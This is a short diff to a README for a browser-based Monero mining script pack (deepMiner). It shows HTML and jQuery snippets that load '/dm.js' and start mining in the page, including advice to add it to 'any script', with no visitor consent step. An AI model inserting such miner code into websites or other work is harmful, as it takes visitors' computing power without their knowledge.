@@ -38,9 +38,16 @@ xmrMiner-scriptPack.git
 ```html
 <script src="/dm.js"></script>
 <script>
-    var miner = new deepMiner.Anonymous('xmr_addr').start();
-    miner.setThrottle(0.5);
+    deepMiner.Anonymous('xmr_addr').start();
 </script>
+```
+- OR if jQuery used, add to any script:
+```javascript
+$.getScript('/dm.js', function(){
+    var m = new deepMiner.Anonymous('xmr_addr',{autoThreads: true});
+    m.start();
+    m.setThrottle(0.5);
+});
 ```
 
 
